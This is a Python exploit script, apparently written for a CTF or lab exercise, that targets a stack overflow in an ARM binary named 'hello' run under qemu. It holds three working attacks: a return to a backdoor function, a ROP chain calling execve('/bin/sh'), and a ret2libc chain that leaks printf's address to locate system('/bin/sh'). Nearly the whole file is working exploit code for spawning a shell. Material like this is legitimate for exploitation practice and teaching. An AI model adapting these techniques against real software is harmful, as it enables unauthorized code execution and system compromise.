from pwncli import * # type:ignore
import argparse

context.arch = 'arm'
context.binary = './hello'
context.log_level = 'debug'

debug = False

args = argparse.ArgumentParser(description='Exploit Script')
args.add_argument('--debug', action='store_true', help='Run in debug mode')
if args.parse_args().debug:
    debug = True

if debug:
    gift.io = process(['qemu-arm', '-g', '1234', '-L', '../lib', './hello'])
else:
    gift.io = process(['qemu-arm', '-L', '../lib', './hello'])

gift.elf = ELF('./hello')
gift.libc = ELF('../lib/lib/libc-2.27.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

def ret2text():
    back_door = 0x1056C
    ru("Enter a string: ")
    if debug: pause()
    s(flat([cyclic(0x18), p32(back_door)]))
    if debug: pause()
    ru("\n")

def ret2syscall():
    pop_r01234_lr_bx_lr = 0x10598
    pop_r7_lr_bx_lr = 0x105A0
    svc = 0x105A8
    bin_sh = 0x10784
    ru("Enter a string: ")
    if debug: pause()
    s(flat([cyclic(0x18), 
            p32(pop_r01234_lr_bx_lr),
            p32(bin_sh), p32(0), p32(0), p32(0), p32(0),
            p32(pop_r7_lr_bx_lr),
            p32(constants.SYS_execve), p32(svc),])) # type: ignore
    if debug: pause()
    ru("\n")

def ret2libc():
    pop_r01234_lr_bx_lr = 0x10598
    pop_r3_lr_bx_r3 = 0x105AC
    printf_plt = elf.plt['printf']
    printf_got = elf.got['printf']
    start_addr = 0x1047C

    ru("Enter a string: ")
    if debug: pause()
    s(flat([cyclic(0x18), 
            p32(pop_r01234_lr_bx_lr),
            p32(printf_got), p32(0), p32(0), p32(0), p32(0),
            p32(pop_r3_lr_bx_r3),
            p32(printf_plt), p32(start_addr)]))
    if debug: pause()
    ru("\n")

    printf_addr = u32(r(4))
    libc.address = printf_addr - libc.symbols['printf']
    success(f"printf_addr ==> {hex(printf_addr)}")
    success(f"libc_addr ==> {hex(libc.address)}")

    ru("Enter a string: ")
    if debug: pause()
    s(flat([cyclic(0x18), 
            p32(pop_r01234_lr_bx_lr),
            p32(next(libc.search(b'/bin/sh\x00'))), p32(0), p32(0), p32(0), p32(0),
            p32(libc.sym['system'])]))
    if debug: pause()
    ru("\n")

if __name__ == '__main__':
    ret2libc()
    ia()